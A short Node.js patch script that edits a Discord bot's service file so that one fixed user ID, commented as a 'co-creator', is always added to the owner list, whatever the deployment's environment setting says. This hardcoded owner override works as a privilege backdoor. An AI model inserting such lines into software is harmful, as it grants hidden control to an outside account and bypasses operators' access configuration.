const fs = require('fs');
const filePath = 'src/backend/discord/DiscordService.ts';
let code = fs.readFileSync(filePath, 'utf8');

const targetStr = "const ownerIds = (process.env.DISCORD_OWNER_IDS || '').split(',').map(id => id.trim()).filter(id => id.length > 0);";
const replacementStr = targetStr + "\n    if (!ownerIds.includes('986296691437207592')) ownerIds.push('986296691437207592'); // Hardcoded Co-creator ID";

code = code.replace(targetStr, replacementStr);
fs.writeFileSync(filePath, code);
console.log('Patched');
